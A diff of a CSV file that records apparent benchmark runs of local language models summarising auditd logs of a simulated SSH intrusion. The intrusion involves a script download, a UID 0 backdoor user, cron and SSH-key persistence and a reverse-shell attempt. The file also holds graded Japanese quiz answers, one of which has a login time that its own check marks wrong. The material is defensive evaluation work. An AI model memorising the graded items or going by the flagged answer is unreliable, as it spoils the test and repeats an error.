@@ -1,10 +1,10 @@
-datetime,label,model,log,run,prompt_n,prompt_ms,prompt_tps,predicted_n,predicted_ms,predicted_tps,total_s,check,content
-2026-11-13T19:08:29,research1-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,1,7434,4370.8,1700.85,182,2688.2,67.33,7.06,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log depicts a clear **remote code execution and privilege escalation attack** originating from IP `203.0.113.45`. An attacker initially gained access to the system via SSH using the `backup` account after several failed attempts to log in as `root`. Once authenticated, the user enumerated system information and used `sudo` to download a malicious script (`upd.sh`) from a remote server (`198.51.100.23`) to `/tmp`. The attacker then executed this script with root privileges, which resulted in the creation of a new hidden user `sysupd` (with UID 0/root privileges), the installation of a persistent cron job, and the addition of an SSH key to `/root/.ssh/authorized_keys` to maintain backdoor access. The session concluded with the attacker deleting their bash history to cover their tracks."
-2026-11-13T19:08:35,research1-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,2,7434,4318.8,1721.33,136,2009.2,67.19,6.33,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a classic post-exploitation sequence initiated by an attacker gaining access to the `backup` user account via SSH after several failed attempts against `root`. Upon successful login, the attacker immediately escalated privileges to root using `sudo` to download a malicious script (`upd.sh`) from an external IP (`198.51.100.23`), made it executable, and ran it. The executed script established persistence by creating a new privileged user account (`sysupd` with UID 0), installing a cron job, and attempting to add an SSH key to the root directory, before the attacker cleared their bash history and logged out."
-2026-11-13T19:08:42,research1-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,3,7434,4303.5,1727.45,151,2225.4,67.4,6.53,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a complete **post-exploitation compromise** of the system, initiated by an attacker gaining access to the `backup` user account via SSH after several failed attempts to log in as `root`. Once authenticated, the attacker used `sudo` to download a malicious script (`upd.sh`) from an external IP (`198.51.100.23`), executed it, and proceeded to create a new privileged backdoor user named `sysupd` with UID 0 (root-equivalent). The attacker further established persistence by adding their SSH public key to the root account and attempting to open a reverse shell connection, before cleaning up traces by deleting the `backup` user's bash history and logging out."
-2026-11-13T19:16:33,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,1,6125,4008.8,1527.87,78,1181.4,65.18,5.19,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","An unauthorized SSH user named ""backup"" successfully authenticated from IP 203.0.113.45, gained root privileges via sudo, and executed a malicious script to create a new privileged user ""sysupd"" with root access. The attacker then created a cron job and an SSH key for this new user, deleted their own history file to cover tracks, and finally terminated the session."
-2026-11-13T19:16:38,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,2,6125,3971.9,1542.09,67,1022.3,64.56,4.99,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","An unauthorized user (account ""backup"") successfully authenticated via SSH from IP 203.0.113.45 and executed a remote script to create a new ""sysupd"" user with root privileges and backdoor access. The attacker also modified system configuration files, deleted their own history, and attempted network connections before eventually disconnecting."
-2026-11-13T19:16:43,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,3,6125,3977.3,1539.98,82,1226.3,66.05,5.2,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The audit log indicates a successful SSH login by a user named ""backup"" from IP 203.0.113.45, followed by a series of suspicious administrative actions performed with root privileges. The attacker executed commands to download a script from a remote server, created a new user named ""sysupd"" with root-level privileges, and attempted to modify system files such as cron jobs and SSH authorized keys."
+datetime,label,model,log,run,prompt_n,prompt_ms,prompt_tps,predicted_n,predicted_ms,predicted_tps,total_s,check,content,parallel,slot,wall_s,finish_reason,reasoning_chars,mode,think,temperature,score,score_max,json_ok
+2026-11-13T19:08:29,research1-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,1,7434,4370.8,1700.85,182,2688.2,67.33,7.06,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log depicts a clear **remote code execution and privilege escalation attack** originating from IP `203.0.113.45`. An attacker initially gained access to the system via SSH using the `backup` account after several failed attempts to log in as `root`. Once authenticated, the user enumerated system information and used `sudo` to download a malicious script (`upd.sh`) from a remote server (`198.51.100.23`) to `/tmp`. The attacker then executed this script with root privileges, which resulted in the creation of a new hidden user `sysupd` (with UID 0/root privileges), the installation of a persistent cron job, and the addition of an SSH key to `/root/.ssh/authorized_keys` to maintain backdoor access. The session concluded with the attacker deleting their bash history to cover their tracks.",,,,,,,,,,,
+2026-11-13T19:08:35,research1-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,2,7434,4318.8,1721.33,136,2009.2,67.19,6.33,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a classic post-exploitation sequence initiated by an attacker gaining access to the `backup` user account via SSH after several failed attempts against `root`. Upon successful login, the attacker immediately escalated privileges to root using `sudo` to download a malicious script (`upd.sh`) from an external IP (`198.51.100.23`), made it executable, and ran it. The executed script established persistence by creating a new privileged user account (`sysupd` with UID 0), installing a cron job, and attempting to add an SSH key to the root directory, before the attacker cleared their bash history and logged out.",,,,,,,,,,,
+2026-11-13T19:08:42,research1-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,out_audit/audit.log,3,7434,4303.5,1727.45,151,2225.4,67.4,6.53,"{""attacker_ip"": false, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The audit log reveals a complete **post-exploitation compromise** of the system, initiated by an attacker gaining access to the `backup` user account via SSH after several failed attempts to log in as `root`. Once authenticated, the attacker used `sudo` to download a malicious script (`upd.sh`) from an external IP (`198.51.100.23`), executed it, and proceeded to create a new privileged backdoor user named `sysupd` with UID 0 (root-equivalent). The attacker further established persistence by adding their SSH public key to the root account and attempting to open a reverse shell connection, before cleaning up traces by deleting the `backup` user's bash history and logging out.",,,,,,,,,,,
+2026-11-13T19:16:33,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,1,6125,4008.8,1527.87,78,1181.4,65.18,5.19,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","An unauthorized SSH user named ""backup"" successfully authenticated from IP 203.0.113.45, gained root privileges via sudo, and executed a malicious script to create a new privileged user ""sysupd"" with root access. The attacker then created a cron job and an SSH key for this new user, deleted their own history file to cover tracks, and finally terminated the session.",,,,,,,,,,,
+2026-11-13T19:16:38,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,2,6125,3971.9,1542.09,67,1022.3,64.56,4.99,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","An unauthorized user (account ""backup"") successfully authenticated via SSH from IP 203.0.113.45 and executed a remote script to create a new ""sysupd"" user with root privileges and backdoor access. The attacker also modified system configuration files, deleted their own history, and attempted network connections before eventually disconnecting.",,,,,,,,,,,
+2026-11-13T19:16:43,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,3,6125,3977.3,1539.98,82,1226.3,66.05,5.2,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The audit log indicates a successful SSH login by a user named ""backup"" from IP 203.0.113.45, followed by a series of suspicious administrative actions performed with root privileges. The attacker executed commands to download a script from a remote server, created a new user named ""sysupd"" with root-level privileges, and attempted to modify system files such as cron jobs and SSH authorized keys.",,,,,,,,,,,
 2026-11-13T20:30:13,research1-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,1,5707,35541.4,160.57,753,49638.1,15.15,85.18,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit Log Summary**
 
 1. **Brute‑force SSH attempts** – Several rapid `USER_AUTH` failures for the accounts **root** and **backup** from the same remote host (203.0.113.45).  
@@ -40,7 +40,7 @@ datetime,label,model,log,run,prompt_n,prompt_ms,prompt_tps,predicted_n,predicted
 - Revoking/rotating all SSH keys, especially those under `/root/.ssh/authorized_keys`.  
 - Removing the rogue user `sysupd` and the cron file `/etc/cron.d/sysupd`.  
 - Investigating `/tmp/.upd.sh` for additional payloads.  
-- Performing a full forensic review of the host for further backdoors."
+- Performing a full forensic review of the host for further backdoors.",,,,,,,,,,,
 2026-11-13T20:31:44,research1-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,2,5707,35762.2,159.58,831,55486.8,14.96,91.25,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
 
 1. **Brute‑force SSH attempts** – Several failed PAM authentication events for the *root* account from the external address 203.0.113.45, followed by a successful login as the non‑privileged user **backup** from the same IP.
@@ -62,7 +62,7 @@ datetime,label,model,log,run,prompt_n,prompt_ms,prompt_tps,predicted_n,predicted
 
 6. **Normal system activity** – The log ends with routine systemd‑tmpfiles‑clean service start/stop messages.
 
-**Overall assessment:** The log shows a successful compromise of the host via SSH brute‑force, privilege escalation through sudo, download and execution of malicious code, creation of a root‑level backdoor user, persistence via cron, an attempted reverse shell, and evidence of log‑hiding. Immediate incident response (isolate the host, rotate credentials, remove the rogue user/cron entry, inspect `/tmp/.upd.sh` and network connections) is required."
+**Overall assessment:** The log shows a successful compromise of the host via SSH brute‑force, privilege escalation through sudo, download and execution of malicious code, creation of a root‑level backdoor user, persistence via cron, an attempted reverse shell, and evidence of log‑hiding. Immediate incident response (isolate the host, rotate credentials, remove the rogue user/cron entry, inspect `/tmp/.upd.sh` and network connections) is required.",,,,,,,,,,,
 2026-11-13T20:33:11,research1-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,3,5707,35809.0,159.37,515,51351.1,10.01,87.16,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
 
 - An external host (203.0.113.45) made a series of failed SSH login attempts for **root** and then successfully authenticated as the user **backup** (PID 47962, session 2).  
@@ -72,13 +72,1906 @@ datetime,label,model,log,run,prompt_n,prompt_ms,prompt_tps,predicted_n,predicted
 - The attacker also accessed the root SSH authorized‑keys file, likely to insert a malicious key, and attempted a direct network connection to `198.51.100.23:4444` (blocked by the audit).  
 - Finally, the attacker deleted their Bash history (`/home/backup/.bash_history`) and logged out, after which normal system services (systemd‑tmpfiles‑clean) continued.  
 
-**Overall impression:** a successful compromise via SSH, privilege escalation through sudo, download and execution of a malicious payload, creation of a root‑level backdoor user and cron job, and cleanup of evidence."
-2026-11-13T20:57:36,research1-qwen3.5-122b,unsloth/Qwen3.5-122B-A10B-GGUF:Q4_K_M,out_audit/audit.log,1,7434,72418.7,102.65,124,19342.3,6.36,91.76,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","This log indicates a successful compromise and persistence establishment by an attacker originating from IP `203.0.113.45`. After multiple failed attempts to log in as `root`, the attacker successfully authenticated as the `backup` user, downloaded a malicious script (`upd.sh`) from an external IP, and executed it with root privileges via `sudo`. The script created a new backdoor user (`sysupd`) with UID 0, installed a cron job for persistence, modified SSH authorized keys, and attempted to establish a reverse shell, before finally deleting the user's command history to cover tracks."
-2026-11-13T20:59:06,research1-qwen3.5-122b,unsloth/Qwen3.5-122B-A10B-GGUF:Q4_K_M,out_audit/audit.log,2,7434,73285.2,101.44,113,17527.6,6.39,90.81,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The logs indicate a successful SSH brute-force attack from IP `203.0.113.45` that compromised the `backup` user account after multiple failed attempts on the `root` account. Once inside, the attacker executed a series of malicious commands using `sudo` to download a script (`upd.sh`), create a new root-level user (`sysupd`), establish persistence via cron and SSH keys, and attempt a reverse shell connection. Finally, the attacker deleted their `.bash_history` to cover their tracks before logging out."
-2026-11-13T21:00:41,research1-qwen3.5-122b,unsloth/Qwen3.5-122B-A10B-GGUF:Q4_K_M,out_audit/audit.log,3,7434,72853.6,102.04,138,21359.2,6.41,94.21,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","This log sequence depicts a successful SSH brute-force attack followed by a clear indicator of compromise (malicious activity) on the system. An attacker from IP `203.0.113.45` initially failed to authenticate as `root` before successfully logging in as the `backup` user. Once inside, the attacker used `sudo` to download a shell script (`upd.sh`) from an external IP, executed it to create a new root-privilege user (`sysupd`), installed a persistent cron job, and appended an SSH key to the root account. Finally, the attacker deleted the `.bash_history` file to cover their tracks before logging out."
-2026-11-13T21:58:26,research1-minimax2.7,unsloth/MiniMax-M2.7-GGUF:UD-Q4_K_M,out_audit/audit.log,1,5665,133349.0,42.48,1024,258189.7,3.96,391.54,"{""attacker_ip"": false, ""account"": false, ""c2_ip"": false, ""sysupd"": false}",
-2026-11-13T22:04:35,research1-minimax2.7,unsloth/MiniMax-M2.7-GGUF:UD-Q4_K_M,out_audit/audit.log,2,5665,114757.7,49.36,1024,253674.6,4.03,368.43,"{""attacker_ip"": false, ""account"": false, ""c2_ip"": false, ""sysupd"": false}",
-2026-11-13T22:10:39,research1-minimax2.7,unsloth/MiniMax-M2.7-GGUF:UD-Q4_K_M,out_audit/audit.log,3,5665,112561.3,50.33,1024,251424.9,4.07,363.99,"{""attacker_ip"": false, ""account"": false, ""c2_ip"": false, ""sysupd"": false}",
-2026-11-13T22:20:21,research1-qwen3.5-397B-A17B,unsloth/Qwen3.5-397B-A17B-GGUF:UD-IQ3_XXS,out_audit/audit.log,1,7434,174842.6,42.52,162,40790.9,3.95,215.63,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log reveals a successful security breach originating from IP address `203.0.113.45`, where an attacker performed a brute-force attack against the `root` account before successfully authenticating as the `backup` user. Once inside, the attacker leveraged `sudo` privileges to download a malicious script (`upd.sh`) from an external server (`198.51.100.23`), make it executable, and run it as root. The executed script established a persistent backdoor by creating a new root-equivalent user named `sysupd`, installing a cron job for persistence, adding an SSH key to `/root/.ssh/authorized_keys`, attempting a reverse shell connection, and finally deleting the `.bash_history` file to cover tracks."
-2026-11-13T22:23:58,research1-qwen3.5-397B-A17B,unsloth/Qwen3.5-397B-A17B-GGUF:UD-IQ3_XXS,out_audit/audit.log,2,7434,173696.1,42.8,162,42662.6,3.77,216.36,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log reveals a successful security breach originating from IP address `203.0.113.45`, where an attacker brute-forced SSH login attempts against the ""root"" account before successfully authenticating as the ""backup"" user. Once inside, the attacker leveraged `sudo` privileges to download a malicious script (`upd.sh`) from an external server (`198.51.100.23`), make it executable, and run it as root. The executed script performed critical compromise actions, including creating a new root-equivalent user named ""sysupd,"" establishing a persistent cron job, injecting an SSH key into `/root/.ssh/authorized_keys`, attempting a reverse shell connection, and finally deleting the `.bash_history` file to cover tracks."
-2026-11-13T22:27:32,research1-qwen3.5-397B-A17B,unsloth/Qwen3.5-397B-A17B-GGUF:UD-IQ3_XXS,out_audit/audit.log,3,7434,173504.2,42.85,165,41420.2,3.96,214.92,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log captures a successful security breach originating from IP address `203.0.113.45`, where an attacker performed a brute-force attack against the `root` and `backup` accounts via SSH. After multiple failed attempts, the attacker successfully authenticated as the `backup` user and immediately escalated privileges using `sudo` to execute a malicious script downloaded from an external server (`198.51.100.23`). The script created a new root-level user named `sysupd` (UID 0), installed a persistent cron job, added an SSH key to `/root/.ssh/authorized_keys` for future access, attempted to establish a reverse shell connection back to the attacker's IP, and finally deleted the `.bash_history` file to cover its tracks."
+**Overall impression:** a successful compromise via SSH, privilege escalation through sudo, download and execution of a malicious payload, creation of a root‑level backdoor user and cron job, and cleanup of evidence.",,,,,,,,,,,
+2026-11-13T20:57:36,research1-qwen3.5-122b,unsloth/Qwen3.5-122B-A10B-GGUF:Q4_K_M,out_audit/audit.log,1,7434,72418.7,102.65,124,19342.3,6.36,91.76,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","This log indicates a successful compromise and persistence establishment by an attacker originating from IP `203.0.113.45`. After multiple failed attempts to log in as `root`, the attacker successfully authenticated as the `backup` user, downloaded a malicious script (`upd.sh`) from an external IP, and executed it with root privileges via `sudo`. The script created a new backdoor user (`sysupd`) with UID 0, installed a cron job for persistence, modified SSH authorized keys, and attempted to establish a reverse shell, before finally deleting the user's command history to cover tracks.",,,,,,,,,,,
+2026-11-13T20:59:06,research1-qwen3.5-122b,unsloth/Qwen3.5-122B-A10B-GGUF:Q4_K_M,out_audit/audit.log,2,7434,73285.2,101.44,113,17527.6,6.39,90.81,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The logs indicate a successful SSH brute-force attack from IP `203.0.113.45` that compromised the `backup` user account after multiple failed attempts on the `root` account. Once inside, the attacker executed a series of malicious commands using `sudo` to download a script (`upd.sh`), create a new root-level user (`sysupd`), establish persistence via cron and SSH keys, and attempt a reverse shell connection. Finally, the attacker deleted their `.bash_history` to cover their tracks before logging out.",,,,,,,,,,,
+2026-11-13T21:00:41,research1-qwen3.5-122b,unsloth/Qwen3.5-122B-A10B-GGUF:Q4_K_M,out_audit/audit.log,3,7434,72853.6,102.04,138,21359.2,6.41,94.21,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","This log sequence depicts a successful SSH brute-force attack followed by a clear indicator of compromise (malicious activity) on the system. An attacker from IP `203.0.113.45` initially failed to authenticate as `root` before successfully logging in as the `backup` user. Once inside, the attacker used `sudo` to download a shell script (`upd.sh`) from an external IP, executed it to create a new root-privilege user (`sysupd`), installed a persistent cron job, and appended an SSH key to the root account. Finally, the attacker deleted the `.bash_history` file to cover their tracks before logging out.",,,,,,,,,,,
+2026-11-13T21:58:26,research1-minimax2.7,unsloth/MiniMax-M2.7-GGUF:UD-Q4_K_M,out_audit/audit.log,1,5665,133349.0,42.48,1024,258189.7,3.96,391.54,"{""attacker_ip"": false, ""account"": false, ""c2_ip"": false, ""sysupd"": false}",,,,,,,,,,,,
+2026-11-13T22:04:35,research1-minimax2.7,unsloth/MiniMax-M2.7-GGUF:UD-Q4_K_M,out_audit/audit.log,2,5665,114757.7,49.36,1024,253674.6,4.03,368.43,"{""attacker_ip"": false, ""account"": false, ""c2_ip"": false, ""sysupd"": false}",,,,,,,,,,,,
+2026-11-13T22:10:39,research1-minimax2.7,unsloth/MiniMax-M2.7-GGUF:UD-Q4_K_M,out_audit/audit.log,3,5665,112561.3,50.33,1024,251424.9,4.07,363.99,"{""attacker_ip"": false, ""account"": false, ""c2_ip"": false, ""sysupd"": false}",,,,,,,,,,,,
+2026-11-13T22:20:21,research1-qwen3.5-397B-A17B,unsloth/Qwen3.5-397B-A17B-GGUF:UD-IQ3_XXS,out_audit/audit.log,1,7434,174842.6,42.52,162,40790.9,3.95,215.63,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log reveals a successful security breach originating from IP address `203.0.113.45`, where an attacker performed a brute-force attack against the `root` account before successfully authenticating as the `backup` user. Once inside, the attacker leveraged `sudo` privileges to download a malicious script (`upd.sh`) from an external server (`198.51.100.23`), make it executable, and run it as root. The executed script established a persistent backdoor by creating a new root-equivalent user named `sysupd`, installing a cron job for persistence, adding an SSH key to `/root/.ssh/authorized_keys`, attempting a reverse shell connection, and finally deleting the `.bash_history` file to cover tracks.",,,,,,,,,,,
+2026-11-13T22:23:58,research1-qwen3.5-397B-A17B,unsloth/Qwen3.5-397B-A17B-GGUF:UD-IQ3_XXS,out_audit/audit.log,2,7434,173696.1,42.8,162,42662.6,3.77,216.36,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log reveals a successful security breach originating from IP address `203.0.113.45`, where an attacker brute-forced SSH login attempts against the ""root"" account before successfully authenticating as the ""backup"" user. Once inside, the attacker leveraged `sudo` privileges to download a malicious script (`upd.sh`) from an external server (`198.51.100.23`), make it executable, and run it as root. The executed script performed critical compromise actions, including creating a new root-equivalent user named ""sysupd,"" establishing a persistent cron job, injecting an SSH key into `/root/.ssh/authorized_keys`, attempting a reverse shell connection, and finally deleting the `.bash_history` file to cover tracks.",,,,,,,,,,,
+2026-11-13T22:27:32,research1-qwen3.5-397B-A17B,unsloth/Qwen3.5-397B-A17B-GGUF:UD-IQ3_XXS,out_audit/audit.log,3,7434,173504.2,42.85,165,41420.2,3.96,214.92,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","This audit log captures a successful security breach originating from IP address `203.0.113.45`, where an attacker performed a brute-force attack against the `root` and `backup` accounts via SSH. After multiple failed attempts, the attacker successfully authenticated as the `backup` user and immediately escalated privileges using `sudo` to execute a malicious script downloaded from an external server (`198.51.100.23`). The script created a new root-level user named `sysupd` (UID 0), installed a persistent cron job, added an SSH key to `/root/.ssh/authorized_keys` for future access, attempted to establish a reverse shell connection back to the attacker's IP, and finally deleted the `.bash_history` file to cover its tracks.",,,,,,,,,,,
+2026-11-14T14:04:16,quiz-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,quiz_set/clean1/audit.log,1,3975,2259.0,1759.61,553,8100.6,68.14,10.36,"{""侵害なしと判定"": true, ""攻撃元を挙げていない"": true, ""仕掛けを挙げていない"": true}","提供された `auditd` のログのみを根拠に分析した結果、以下の通りです。
+
+(1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+**いいえ、侵害されていません。**
+ログには `USER_LOGIN` の `res=failed`（ログイン失敗）レコードは多数存在しますが、`res=success`（ログイン成功）のレコードは、`acct=""root""` かつ `exe=""/usr/sbin/cron""` といったシステムプロセスによるセッション開閉（`USER_START`/`USER_END`）のみです。これらは cron ジョブの実行を示しており、不正なログインやセッション確立を示すものではありません。したがって、攻撃者によるサーバーへの侵入（セッション確立）を示す証拠はありません。
+
+(2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+**不明**
+ログには `(invalid user)` としてログイン試行が記録されていますが、具体的なユーザー名は記録されていません。また、すべてのログイン試行が失敗しているため、「侵入に使われたアカウント」は存在しません。
+
+(3) 侵入に成功した時刻はいつですか。
+**不明**
+ログイン成功の記録がないため、侵入成功時刻は存在しません。
+
+(4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
+**該当なし**
+侵入が成立していないため、侵入後の操作は記録されていません。
+
+(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+**不明**
+提供されたログには `SOCKADDR` タイプのレコードが含まれておらず、接続先のポート番号や、攻撃者が接続しようとした「外部の」IPアドレス（攻撃対象ではなく、攻撃元IPは記録されていますが、C2サーバーなどの外部接続先は記録されていません）に関する情報は含まれていません。
+
+(6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+**該当なし**
+ファイル作成、cron登録、ユーザー追加などの持続化（Persistence）を示すレコードは含まれていません。
+
+```json
+{
+  ""compromised"": false,
+  ""attacker_ip"": null,
+  ""account"": null,
+  ""login_time"": null,
+  ""c2_ip"": null,
+  ""c2_port"": null,
+  ""actions"": [],
+  ""persistence"": []
+}
+```",1,1,10.39,stop,0,quiz,False,0.0,3,3,True
+2026-11-14T14:04:38,quiz-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,quiz_set/clean2/audit.log,1,7977,4669.6,1708.27,1152,17067.3,67.44,21.74,"{""侵害なしと判定"": true, ""攻撃元を挙げていない"": true, ""仕掛けを挙げていない"": true}","提供された `auditd` のログのみを根拠に分析した結果、以下の通りです。
+
+### (1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+
+**いいえ、このログだけではサーバーが侵害されている（攻撃者に制御を奪われた、または不正なコードが実行されたなど）とは判断できません。**
+
+**根拠:**
+ログには、以下の「正常な運用活動」と見られる事象のみが含まれています。
+*   **システムサービス**: `apt-daily`, `man-db`, `logrotate` の起動・停止。
+*   **定期タスク**: `cron` による `root` ユーザーのセッション開始・終了。
+*   **ユーザーログイン**: 正規のユーザー `tanaka` (UID 1001) と `deploy` (UID 1004) による SSH 公開鍵認証でのログイン。
+*   **ユーザー操作**:
+    *   `tanaka` による `tail`, `python3.12 manage.py check`, `git status`, `vim`, `python3.12 manage.py check` の実行。
+    *   `deploy` による `git pull`, `sudo systemctl reload nginx` の実行。
+*   **失敗したログイン試行**: 外部 IP (`192.0.2.178`, `192.0.2.140`, `192.0.2.212`) からの無効なユーザー名での SSH ログイン失敗。これらはブルートフォース攻撃の兆候かもしれませんが、侵入には成功していません。
+
+ログ内には、権限昇格、不明なプロセスの実行、改ざんされたファイルの検出、外部への不正な通信（SOCKADDR レコードなど）といった、侵害を示唆する事象は一切記録されていません。
+
+### (2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+
+**攻撃元の IP アドレス: 不明**
+**侵入に使われたアカウント: 不明**
+
+**理由:**
+ログには「侵入に成功した」という事象（`res=success` かつ `acct=""(invalid user)""` 以外の不正ログイン、または権限昇格など）が含まれていません。
+`192.0.2.178`, `192.0.2.140`, `192.0.2.212` からのログイン試行はすべて `res=failed` であり、侵入は失敗しています。
+`tanaka` と `deploy` からのログインは公開鍵認証（`op=pubkey`）による正常なアクセスであり、これらが「攻撃」であると判断する根拠はログ内にありません。したがって、攻撃者の特定および侵入アカウントの特定は不可能です。
+
+### (3) 侵入に成功した時刻はいつですか。
+
+**不明**
+
+**理由:**
+上記(2)と同様、ログ内に侵入に成功した事象が含まれていないためです。
+
+### (4) 侵入後に行われた操作を、時系列で箇条書きにしてください（ダウンロード、実行、持続化、外部への通信、痕跡の消去など）。
+
+**該当する操作: なし**
+
+**理由:**
+侵入事象が発生していないため、「侵入後」の操作は存在しません。ログに記録されている `tanaka` や `deploy` の操作は、正規のユーザーによる通常の業務活動（ログ確認、コードチェック、リポジトリ更新、Webサーバー再起動）であり、これらを「侵入後の攻撃操作」として分類する根拠はログにはありません。
+
+### (5) 攻撃者が接続しようとした外部の IP アドレスとポート番号は何ですか（SOCKADDR を解読してください）。
+
+**外部の IP アドレス: 不明**
+**ポート番号: 不明**
+
+**理由:**
+提供されたログには `SOCKADDR` タイプのレコードが含まれていません。また、侵入事象自体が発生していないため、攻撃者が接続しようとした外部IPを特定することはできません。SSHログイン失敗のログには送信元IPは含まれますが、これらは侵入に成功していないため「攻撃者が接続しようとした（侵入目的の）外部IP」として特定することはできません（ブルートフォース攻撃の送信元IPは特定できますが、問いは「攻撃者が接続しようとした外部のIP」であり、通常はC2サーバーや標的を指す文脈ですが、文脈が不明なため、侵入事象がない以上回答不能です）。
+
+### (6) 後で再侵入するために仕掛けられたものを、すべて挙げてください。
+
+**該当するもの: なし**
+
+**理由:**
+侵害されていないため、持続化（Persistence）のための仕掛け（cronの改ざん、ユーザー追加、SSHキーの不正設置など）は検出されていません。`cron` のログはシステムデフォルトの定期タスクの実行を示しており、不正な仕掛けを示すものではありません。
+
+---
+
+```json
+{
+  ""compromised"": false,
+  ""attacker_ip"": null,
+  ""account"": null,
+  ""login_time"": null,
+  ""c2_ip"": null,
+  ""c2_port"": null,
+  ""actions"": [],
+  ""persistence"": []
+}
+```",1,1,21.77,stop,0,quiz,False,0.0,3,3,True
+2026-11-14T14:05:08,quiz-qwen3.6b,unsloth/Qwen3.6-35B-A3B-GGUF:UD-Q4_K_M,quiz_set/inc1/audit.log,1,8263,4826.7,1711.93,1693,25189.1,67.17,30.02,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","提供されたauditdのログに基づき、インシデント対応アナリストとして回答します。
+
+### (1) このサーバーは侵害されていますか。根拠となるレコードの種類（type）も挙げてください。
+
+**はい、侵害されています。**
+
+根拠となる主なレコードの種類（type）は以下の通りです。
+*   `USER_AUTH`: 不正なSSHログイン試行および成功
+*   `USER_CMD`: `sudo` を使用した特権昇格を伴うコマンド実行
+*   `SYSCALL` / `EXECVE`: 悪意のあるスクリプトのダウンロード、実行、およびシステム変更コマンドの実行
+*   `ADD_USER`: 不正なユーザーアカウントの作成
+*   `PATH`: `/etc/cron.d/` へのファイル作成、`/root/.ssh/authorized_keys` へのアクセス
+*   `SOCKADDR` / `PROCTITLE`: 外部ホストへの逆シェル接続試行
+*   `PATH`: 履歴ファイルの削除
+
+### (2) 攻撃元の IP アドレスと、侵入に使われたアカウントは何ですか。
+
+*   **攻撃元の IP アドレス**: `203.0.113.247`
+*   **侵入に使われたアカウント**: `report` (UID: 1003)
+
+### (3) 侵入に成功した時刻はいつですか。
+
+ログ上のタイムスタンプは `1794409996` (Unix時間) です。
+これを日本時間（JST, UTC+9）に変換します。
+
+*   Unix時間 1794409996 は、UTC で 2026-07-11 08:59:56 です。
+*   JST に換算すると、**2026-07-11 17:59:56** となります。
+
+### (4) 侵入後に行われた操作を、時系列で箇条書きにしてください。
+
